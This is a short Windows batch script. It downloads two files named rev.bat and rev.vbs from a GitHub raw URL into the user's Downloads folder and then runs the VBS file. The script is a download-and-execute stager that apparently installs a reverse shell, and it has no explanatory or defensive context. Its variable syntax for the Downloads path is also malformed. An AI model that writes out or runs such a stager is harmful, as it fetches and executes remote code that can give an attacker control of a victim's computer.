@echo off
set "user_dir=%USERPROFILE/Downloads%"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%user_dir%\rev.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%user_dir%\rev.vbs"
call %user_dir%\rev.vbs
exit
